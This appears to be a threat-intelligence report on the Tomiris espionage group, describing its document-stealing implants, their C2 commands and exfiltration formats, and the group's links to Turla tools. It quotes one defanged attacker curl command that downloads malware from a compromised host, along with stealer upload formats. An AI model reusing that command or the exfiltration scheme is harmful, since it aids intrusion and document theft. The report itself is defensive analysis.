Introduction
We introduced Tomiris to the world in September 2021, following our investigation of a DNShijack against a government organization in the Commonwealth of Independent States (CIS).
Our initial report described links between a Tomiris Golang implant and SUNSHUTTLE
(which has been associated to NOBELIUM/APT29/TheDukes) as well as Kazuar (which has
been associated to Turla); however, interpreting these connections proved difficult.
We continued to track Tomiris as a separate threat actor over three new attack campaigns
between 2021 and 2023, and our telemetry allowed us to shed light on the group. In this blog
post, we’re excited to share what we now know of Tomiris with the broader community, and
discuss further evidence of a possible connection to Turla.

Actor profile
Tomiris focuses on intelligence gathering in Central Asia. Tomiris’s endgame
consistently appears to be the regular theft of internal documents.

1/19

The threat actor targets government and diplomatic entities in the CIS. The occasional
victims discovered in other regions (such as the Middle East or South-East Asia) turn
out to be foreign representations of CIS countries, illustrating Tomiris’s narrow focus.
It is characterized by its tendency to develop numerous low-sophistication “burner”
implants in a variety of programming languages that are repeatedly deployed against
the same targets, using elementary but efficient packaging and distribution techniques.
Tomiris occasionally leverages commercial or open-source RATs.
Language artifacts discovered in Tomiris’s implant families and infrastructure from
distinct campaigns all indicate that the threat actor is Russian-speaking.
Overall, Tomiris is a very agile and determined actor, open to experimentation – for
instance with delivery methods (DNS hijacking) or command and control (C2) channels
(Telegram).
The following map shows the countries where we detected Tomiris targets (colored in green:
Afghanistan and CIS members or ratifiers). It is worth noting that while we identified a few
targets in other locations, all of them appear to be foreign diplomatic entities of the colored
countries:

Tomiris’s polyglot toolset
Tomiris uses a wide variety of malware implants developed at a rapid pace and in all
programming languages imaginable. We hypothesize that the general aim is to provide
operators with “full-spectrum malware” in order to evade security products. In fact, on several
occasions we observed the actor persistently cycling through available malware strains until
one of them was finally allowed to run on victim machines.
Tools used by Tomiris fall into three categories:
Downloaders, rudimentary malicious programs whose role is to deploy a backdoor or
required additional legitimate tools.
Backdoors, whose feature set is typically limited to reconnaissance, command
execution, file download and file upload.
File stealers specifically built to exfiltrate documents, often relying on a hardcoded list
of file extensions to automatically find recently edited files and upload them to a C2.
Some file stealers are backdoor variants and share the same code base.
Tomiris goes after its victims using a wide variety of attack vectors: spear-phishing emails
with malicious content attached (password-protected archives, malicious documents,
weaponized LNKs), DNS hijacking, exploitation of vulnerabilities (specifically ProxyLogon),
suspected drive-by downloads and other “creative” methods (see details of the investigation
described below). The following table lists all Tomiris malware families we are aware of:

leveraged to deploy other Tomiris implants:

Relationships between Tomiris tools. Arrows indicate direct execution.
Overall, pieces from the Tomiris toolset appear to be generally interchangeable and don’t
appear to be tied to specific campaigns or victims. Operators routinely mix and match the
various families, trying to deploy tools (often repeatedly) with little regard for stealth until one
doesn’t get caught by antivirus software.
The following paragraphs provide a summary description of the main malware strains used
by Tomiris.

Telemiris
Telemiris is a Python backdoor originally packed with PyInstaller (we later identified some
Nuitka-packaged samples as well). Its name derives from the fact that it uses Telegram as a
C2 channel. After setting up persistence (copying itself under %AppData%/service/ and
5/19

creating a RUN key entry), the malware enters its main loop where it waits for Telegram
messages and replies to them. Supported commands are:
/run

Execute an arbitrary command on the victim’s machine. It’s worth noting that
command results are expected to be encoded in Cyrillic codepage.

/download
<path>

Sends the contents of the file stored on the victim’s machine at the given
path.

[file
attachment]

Writes the received file on the victim’s machine at the path specified in the
attachment’s caption, or in the current directory by default. Telemiris replies
with “Файл загружен!” (“File downloaded!”).

From what we observed, Telemiris is used as a first-stage implant that operators use to
deploy other tools such as Roopy, JLORAT, or even the legitimate WinSCP binary, to further
exfiltrate files.

Roopy
Written in Pascal, this file stealer crawls the victim’s filesystem at regular intervals and
uploads all files of interest to its C2 server. At startup, it wastes CPU cycles on dead code
and useless loops, which we assume are for evasion purposes. Roopy then creates its
working directory (%AppData%/Microsoft/OneDrive) where it stores the list of already
uploaded files (as upload.dat) and a copy of documents waiting to be uploaded (in the
backup subfolder).
Then, every 40-80 minutes, Roopy crawls C:\Users and all other drives (D:, E:, …), looks for
all documents (.doc, .docx, .xls, .xlsx, .txt, .pdf) modified in the last month, and stages them
for upload. Discovered files are collected in ZIP archives up to 5MB in size and sent to the
C2 server over plain HTTP using POST requests containing such data as:
Delphi/Pascal
1

{

2

"n":"[timestamp]_[part].zip",

3

"t":"[computer name]",

4

"s": "[timestamp]",

5

"b64":"[base64-encoded zip file]"

6

}

6/19

This data format, naming convention as well as the URL scheme used by the C2 server (i.e.,
/h/pa) are very similar to SBZ filestealer. We identified a number of variants of Roopy where
logging can be either enabled or disabled by default, or where the base64 encoding scheme
was replaced by a simple subtraction from the bytes of the obfuscated data.

JLORAT
Our first sightings of this Rust malware date back to August 2022. Similar to Telemiris,
JLORAT copies itself under %AppData% and sets up persistence via a registry RUN key. It
also creates a mutex to ensure atomic execution (“whatever”, as in the default usage
example for the “single-instance” Rust library that is embedded). The backdoor starts by
gathering information on the victim machine, such as the system information, current user
and public IP address. The information is sent via an HTTP POST request to the C2 on a
non-standard port (i.e., 9942). Sample data sent by the C2 could be:
Delphi/Pascal

"admin": true,

"cmd": "",

"cpu_vendor": {

"cpu_usage": 0,

"version": "Windows 7 Professional"

}

JLORAT then looks for specific keywords in the data returned by the C2 to start processing
orders.

cmd|[command]

Executes the specified command, and returns the result in the cmd
key of the JSON response. Some specific subcommands are
processed by JLORAT directly and not passed to the command
prompt, such as cmd|cd (change working directory), cmd|ls or cmd|dir
(lists file in the current directory) and cmd|curfile (returns the path to
the JLORAT binary).

upload|path

Sends the designated file from the victim to the C2, on TCP port 9999.

download|url|path

Saves the file at the given URL to the provided path on the victim’s
machine.

screen

Takes a screenshot and sends it to the C2 on TCP port 9999.

Data sent to port 9999 is not passed in a JSON dictionary, but instead follows a specific
format:
Offset

0

FILENAME_LEN

Length of the filename of the data being sent

4

FILENAME

Name of the file being sent

4 + FILENAME_LEN

CONTENT_LEN

Length of the data

8 + FILENAME_LEN

CONTENT

Payload

We also discovered variants of JLORAT bundled with additional modules – effectively turning
it into a file stealer we call JLOGRAB. Just like Roopy, JLOGRAB:
Periodically looks for documents (a combination of.txt, .pdf, .xml, .xlsx, .doc and .docx
files depending on the sample)
Saves the list as %AppData%/temp_id.txt
Copies discovered documents under %AppData%/transport
Uploads them to the C2 in ZIP archives.
JLORAT contains traces of Russian language in status messages (“Директория
установлена!”, meaning “Directory set”). The source binary also contains metadata
indicating some of the source code is stored in a “moduls” folder, which appears to be a
misspelling of the English word “modules”, or a poor transliteration of the Russian word
“модуль” (pronounced: modul’).

Tomiris’s deployment spree: TunnusSched giveaway
On January 5, 2023, Mandiant released a blog post describing attacks against Ukrainian
entities that they attributed to Turla. Let’s start by briefly summing up their findings:

9/19

In September 2022, a threat actor purchased an expired domain name (anam0rph[.]su)
that used to be part of a botnet (Andromeda) infrastructure. This allowed them to
receive incoming connections from previous, dormant infections and take over a
number of machines.
Victims in Ukraine were infected with KopiLuwak and QUIETCANARY, two malware
strains previously associated with Turla.
While publicly available data indeed shows that anam0rph[.]su was re-registered on August
12, 2022, we couldn’t find any link between Andromeda and KopiLuwak from our telemetry.
Nevertheless, we had been tracking QUIETCANARY since 2019 under the name
“TunnusSched” (not “Tunnus” as Mandiant’s reporting indicates), and decided to take a
closer look at samples collected during the same period.
To our great surprise, we discovered one TunnusSched/QUIETCANARY sample (MD5
B38160FC836AD42F1753A0873C844925) had been delivered to a government target in the
CIS on September 13, 2022. Our telemetry additionally shows that this TunnusSched
malware was deployed…from Tomiris’s Telemiris (MD5
C49DBF390E876E926A338EA07AC5D4A7).
More precisely, on September 13, 2022, around 05:40 UTC, an operator attempted to deploy
several known Tomiris implants via Telemiris: first a Python Meterpreter loader, then JLORAT
and Roopy. These efforts were thwarted by security products, which led the attacker to make
repeated attempts, from various locations on the filesystem:

All these attempts ended in failure. After a one-hour pause, the operator tried again at 07:19
UTC, this time using a TunnusSched/QUIETCANARY sample:
Delphi/Pascal
1

curl hxxps://crane[.]mn/wp-content/plugins/jetpack/modules/photoncdn/EpsonDeviceControl.exe –output [REDACTED]\epsondevicecontrol.exe

The TunnusSched sample was blocked as well, and the operator resumed trying to deploy
JLORAT and Roopy samples up to the next day. This activity and brute-force approach to
infection is completely consistent with other Tomiris infections we have observed in the past.

Attribution: reading KopiLuwak’s story again

11/19

Mandiant noted that some elements of the recent TunnuSched case they analyzed “appear
to be a departure from historical Turla operations”, but the use of KopiLuwak and
TunnusSched led them to link this activity to Turla anyway. In order to perform a critical
analysis of this attribution process, we need to go back in time.

KopiLuwak has belonged to Turla
Kaspersky first reported on KopiLuwak in 2016. Back then, this JavaScript reconnaissance
tool was used to deploy ICEDCOFFEE in countries like Greece, Romania and Qatar. We
attributed the associated attack campaign to Turla and could not find any reason to believe
that was incorrect.

TunnusSched and KopiLuwak are part of the same toolset
Starting from 2019, we discovered additional implant families that were linked to KopiLuwak
(and so, to Turla), starting from 2019. The implants were additionally linked together, mainly
because they leverage an identical RC4 implementation:

Code similarities with TunnusSched

12/19

Code similarity between Topinambour (left) and TunnusSched (right)
The RC4 implementation in these samples results in strictly identical .NET bytecode that, as
far as we could verify, is unique to Tunnus, TunnusSched and Topinambour.
The fact that all these implants are interconnected leaves little doubt, and Topinambour at
least is strongly linked with KopiLuwak. As a result, we (still) believe with high confidence
that TunnusSched and KopiLuwak are both part of similar toolsets, starting from 2019 at
the latest.
Mandiant’s recent findings also confirm that KopiLuwak and TunnusSched were still part
of the same toolset as of September 2022, as they were both deployed against targets in
Ukraine during a single operation.

But Tomiris uses TunnusSched
As we recently discovered (and detailed in “Tomiris’s deployment spree: TunnusSched
giveaway”), TunnusSched was leveraged by Tomiris against a government target in the
CIS in September 2022.
Additionally, we believe with medium confidence the TunnusSched usage described by
Mandiant to be part of Tomiris’s operations, because:

13/19

The TunnusSched sample that was leveraged by Tomiris (MD5
B38160FC836AD42F1753A0873C844925) is very similar to the one that was deployed
from KopiLuwak as per Mandiant’s reporting (MD5
403876977DFB4AB2E2C15AD4B29423FF). Most notably, they share identical RC4
encryption keys, user agent strings, unused code (the “ServerInfoExtractor” class),
PDB root path
(“c:\Users\Scott\source\repos\Kapushka.Client\BrowserTelemetry\obj\Release\”,
starting with a lowercase “c:”), both have explicit references to VisualStudio 15.7, and a
compilation date set to September 2022.
The TunnusSched sample used by Tomiris and the one referenced by Mandiant were
both (only) deployed against targets in the CIS during the same timeframe (September
2022).
The TunnusSched deployment described by Mandiant involved taking over an extinct
Andromeda C2 domain. We first introduced Tomiris as a threat actor who took over
legitimate government hostnames to deploy the Tomiris Golang implant, and it has
continued to do so. As a result, we believe it is likely Tomiris may have hijacked extinct
Andromeda hostnames or domains.

So Tomiris uses KopiLuwak!
As we have already established, TunnusSched and KopiLuwak are part of similar toolsets
(starting from 2019 at least). They were also used together during the same operation in
September 2022 in the CIS, while TunnusSched was also deployed separately by Tomiris in
the CIS – both independently analyzed cases leveraging very similar TunnusSched samples.
As a result, we believe with medium-to-high confidence that both TunnusSched and
KopiLuwak are being leveraged by Tomiris. Additionally, we cannot rule out Tomiris
having used KopiLuwak as early as 2019, conducting operations that may have been
wrongly attributed to Turla back then.

Wait: wouldn’t that mean Tomiris IS Turla?
This entire discussion would be moot if we believed Tomiris to be (a sub-cluster of) Turla –
but this is not the case. While our initial blog post introducing Tomiris noted similarities with
malware used in the Sunburst attack, we continued to track the two sets of activity
separately. Years later, we are convinced that despite possible ties between the two groups,
Turla and Tomiris are separate actors. Tomiris is undoubtedly Russian-speaking, but its
targeting and tradecrafts are significantly at odds with what we have observed for Turla. In
addition, Tomiris’s general approach to intrusion and limited interest in stealth are
significantly at odds with documented Turla tradecraft.
It follows that two groups (that we know of) may have used KopiLuwak at different points in
time. What are the possible explanations for this?

14/19

It is possible that Turla doesn’t mind using a tool that was burned in 2016 and is still
using it in current operations along with new tools.
Given that KopiLuwak, Tunnus, TunnusSched, etc. are written in JavaScript and .NET,
where the source code is essentially provided with the malware, other threat actors
may have repurposed these tools and are using them under a false flag.
Turla shares tool and expertise with Tomiris, or cooperates with Tomiris on joint
operations. In this scenario, it might be acceptable for Turla to give away burned tools,
or to use old implants that will not disclose current capabilities to their partners.
Tomiris and Turla rely on a common supplier that provides offensive capabilities. Or
maybe Tomiris initially started out as a private outfit writing tools for Turla and is now
branching out into the mercenary business. If so, it is entirely possible that Tomiris,
using the toolset it developed for Turla, is conducting operations for different
customers.
Our assessment is that the first two hypotheses are the least likely and that there exists a
form of deliberate cooperation between Tomiris and Turla. Its exact nature is, however,
hard to determine with the information we have at hand. In any case, depending on when
Tomiris started using KopiLuwak, a number of campaigns and tools believed to be linked to
Turla may in fact need to be re-evaluated.
Not only Topinambour, Tunnus, TunnusSched (QUIETCANARY) and RocketMan may have
been used by Tomiris in the past (we know this is the case for TunnusSched, and very likely
for Tunnus due to the discovery of government victims in Russia in 2019), it could also be the
case that these tools are Tomiris’s exclusive property. Looking back, we cannot help but
notice that all of these tools were predominantly used in the CIS region, which is consistent
with Tomiris’s traditional victimology.

Conclusion
With this report, we hope to alert the community to the dangers of using KopiLuwak and
TunnusSched to link cyberattacks to Turla. To the best of our knowledge, this toolset is
currently shared between Tomiris and Turla and we cannot rule out that more actors outside
our purview have access to it. We expect the attribution of this cluster of activities to remain
unclear for the near future.
In the grander scheme of things, this investigation reveals the pitfalls that the information
security industry faces when working on cyberattacks. We rely on a knowledge pool
generously shared among all participants, yet information decays: what is true today may
turn out to be wrong tomorrow. Discovering new, reliable data isn’t enough; existing
assumptions also need to be substantiated – which can only happen when vendors publish
data. In that spirit, we kindly thank Mandiant for the research they published.

15/19

Finally, this investigation illustrates the limits of technical attribution. Looking at infections and
malware samples only gets us so far and we are often reminded that APT groups are subject
to organizational and political constraints. On rare occasions, we stumble upon a piece of the
puzzle that allows us to pierce the veil.
As for the Tomiris mystery, we’ll be eagerly awaiting the next piece.
